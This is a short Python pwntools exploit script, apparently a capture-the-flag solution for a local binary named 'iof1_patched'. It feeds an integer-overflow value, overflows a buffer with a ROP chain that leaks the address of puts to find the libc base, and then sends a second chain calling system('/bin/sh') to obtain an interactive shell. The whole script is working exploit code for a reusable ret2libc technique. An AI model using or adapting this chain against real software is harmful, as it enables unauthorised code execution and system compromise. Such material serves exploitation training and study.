from pwn import *

context.binary = exe = ELF("./iof1_patched",checksec=False)
libc = ELF("./libc.so.6",checksec=False)
ld = ELF("./ld-2.31.so",checksec=False)

p = process(exe.path)

pop_rdi = 0x00000000004013e3

p.recvline()
p.recvline()

payload = b'18446744073709551616'

p.sendlineafter(b'> ', payload)

payload = b'A'*0x18
payload += p64(pop_rdi) + p64(exe.got['puts']) 
payload += p64(exe.plt['puts']) +p64(exe.sym['main'])

p.sendlineafter(b'secret: ',payload)

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 492448
log.info("libc_leak: " + hex(libc_leak))
log.info("libc_base: " + hex(libc.address))

payload = b'18446744073709551616'

input()

p.sendlineafter(b'> ', payload)

payload = b'A'*0x18
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])

p.sendlineafter(b'secret: ',payload)

p.interactive()